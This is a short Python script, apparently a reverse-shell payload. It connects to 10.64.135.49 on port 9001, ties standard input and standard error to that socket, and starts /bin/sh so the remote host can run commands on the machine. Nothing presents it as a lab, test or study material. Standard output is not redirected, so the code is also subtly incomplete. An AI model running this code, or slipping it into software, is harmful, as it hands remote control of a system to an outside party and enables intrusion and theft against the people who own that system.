import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.64.135.49", 9001))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh"])